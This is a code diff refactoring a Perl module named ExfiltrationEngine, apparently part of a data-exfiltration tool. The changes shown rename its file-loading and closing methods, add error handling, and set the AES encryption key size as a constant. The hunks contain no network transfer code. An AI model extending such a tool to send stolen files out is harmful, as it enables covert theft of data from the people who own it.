@@ -2,10 +2,13 @@
 
 package ExfiltrationEngine;
 
+use Carp;
 use Crypt::AES::CTR;
 use File::stat;
 use LWP::UserAgent;
 use Moose;
+
+use constant SIZE   =>  256;
 
 has delay => (
     is  =>  'rw',
@@ -31,25 +34,27 @@ has encryptionKey => (
     isa =>  'Str'
 );
 
-sub load {
+sub loadFile {
     my($self, $file) = @_;
 
-    open $self->{file}, '<', $file or die $!;
+    open $self->{file}, '<', $file or croak "File [$file] doesn't exist";
     binmode $self->file;
 
     return stat($file)->size;
 }
 
-sub close {
+sub closeFile {
     my $self = shift;
 
-    close($self->file);
+    close($self->file) or croak "File cannot be closed";
+
+    return;
 }
 
 sub encrypt {
     my($self, $data) = @_;
 
-    return Crypt::AES::CTR::encrypt($data, $self->encryptionKey, 256);
+    return Crypt::AES::CTR::encrypt($data, $self->encryptionKey, @{[ SIZE ]});
 }
 
 1;
